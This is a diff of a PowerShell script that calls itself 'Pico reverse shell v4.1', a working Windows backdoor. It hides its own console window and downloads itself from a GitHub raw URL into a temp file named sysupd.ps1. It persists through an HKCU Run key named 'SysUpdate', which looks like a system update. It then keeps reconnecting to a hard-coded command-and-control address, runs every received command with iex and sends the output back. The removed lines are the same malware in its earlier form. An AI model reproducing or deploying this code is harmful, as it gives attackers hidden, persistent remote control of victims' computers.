@@ -1,46 +1,65 @@
-# Pico reverse shell v4 - OG loop + screenshot/window/kill/persistence/hide
-# C2: 172.16.176.40:4444 | GitHub: raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v4.ps1
+# Pico reverse shell v4.1 - Fixed Loop & Logic
+# C2: 172.16.176.40:4444
 
-# Hide window
-$a = Add-Type -Name Win32 -MemberDefinition @'
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-[DllImport("user32.dll")]
-public static extern IntPtr GetForegroundWindow();
-[DllImport("user32.dll")]
-public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
-[DllImport("user32.dll")]
-public static extern IntPtr GetShellWindow();
-[DllImport("gdi32.dll")]
-public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
-[DllImport("gdi32.dll")]
-public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth, int nHeight);
-[DllImport("gdi32.dll")]
-public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hGDIObj);
-[DllImport("gdi32.dll")]
-public static extern bool BitBlt(IntPtr hDestDC, int X, int Y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);
-[DllImport("gdi32.dll")]
-public static extern bool DeleteDC(IntPtr hDC);
-[DllImport("gdi32.dll")]
-public static extern bool DeleteObject(IntPtr hObject);
-[DllImport("user32.dll")]
-public static extern IntPtr GetDC(IntPtr hwnd);
-[DllImport("user32.dll")]
-public static extern int ReleaseDC(IntPtr hwnd, IntPtr hDC);
-'@ -PassThru; $a::ShowWindow((Get-Process -Id $PID).MainWindowHandle,0) 2>$null
+# 1. Hide the PowerShell Window
+$m = Add-Type -Name Win32 -MemberDefinition @'
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'@ -PassThru
+$m::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
-# Persistence - HKCU Run self-download
+# 2. Persistence Setup (HKCU Run Key)
 $gh = 'https://raw.githubusercontent.com/B15cu1t/shell.ps1/main/shell_v4.ps1'
-$tmp = "$env:TEMP\sysupd.ps1"; if (-not (Test-Path $tmp)) { iwr $gh -UseBasicParsing | % Content | sc $tmp }; 
-$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; if (-not (gp $reg -Name SysUpdate)) { sr $reg -Name SysUpdate -Value "powershell -w hidden -f $tmp" }
+$tmp = "$env:TEMP\sysupd.ps1"
+$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 
-# OG Pico loop - NO custom handlers/StreamReader - Linux cmds work
+if (-not (Test-Path $tmp)) { 
+    try { Invoke-WebRequest $gh -OutFile $tmp -UseBasicParsing } catch {} 
+}
+if (-not (Get-ItemProperty $reg -Name "SysUpdate" -ErrorAction SilentlyContinue)) { 
+    Set-ItemProperty $reg -Name "SysUpdate" -Value "powershell.exe -WindowStyle Hidden -File $tmp" 
+}
+
+# 3. Main Reverse Shell Loop
 while($true) {
     try {
-        $c = New-Object System.Net.Sockets.TCPClient('172.16.176.40',4444); $s = $c.GetStream()
-        [byte[]]$b = 0..65535|%{0}; while(($i = $s.Read($b,0,$b.Length)) -ne 0) { $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i); 
-            $o = (iex $d 2>&1 | Out-String); if($o) {$o = $o.Trim()}; $sb = (New-Object -TypeName System.Text.ASCIIEncoding).GetBytes("PS $PWD`n$o`n"); $s.Write($sb,0,$sb.Length); $s.Flush() };
-        $c.Close(); if($d -eq 'kill') { rp $tmp -Force; ri $reg -Name SysUpdate -Force; Stop-Process -Id $PID -Force }; Start-Sleep 5
+        $c = New-Object System.Net.Sockets.TCPClient('172.16.176.40', 4444)
+        $s = $c.GetStream()
+        $e = New-Object System.Text.UTF8Encoding
+        
+        # Initial Connection Message
+        $prompt = $e.GetBytes("Connected to $($env:COMPUTERNAME). Type 'kill' to remove persistence and exit.`nPS $PWD> ")
+        $s.Write($prompt, 0, $prompt.Length)
+
+        [byte[]]$b = New-Object byte[] 65535
+        while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
+            $d = $e.GetString($b, 0, $i).Trim()
+            
+            # --- Kill Logic (Now inside the loop) ---
+            if($d -eq 'kill') {
+                $msg = $e.GetBytes("Cleaning up and exiting...`n")
+                $s.Write($msg, 0, $msg.Length)
+                
+                # Remove Registry Persistence
+                Remove-ItemProperty -Path $reg -Name "SysUpdate" -Force -ErrorAction SilentlyContinue
+                # Note: Cannot delete $tmp while script is running, but we stop the process
+                Stop-Process -Id $PID -Force
+            }
+
+            # --- Command Execution ---
+            # Using try/catch inside iex to prevent the whole shell from crashing on bad syntax
+            $out = try { 
+                if ($d) { iex $d 2>&1 | Out-String } else { "" } 
+            } catch { $_.Exception.Message }
+
+            # Send Output + New Prompt
+            $response = $e.GetBytes($out + "`nPS $PWD> ")
+            $s.Write($response, 0, $response.Length)
+            $s.Flush()
+        }
+        $c.Close()
     }
-    catch { Start-Sleep 5 }
+    catch { 
+        # Wait 5 seconds before retrying if C2 is down
+        Start-Sleep 5 
+    }
 }
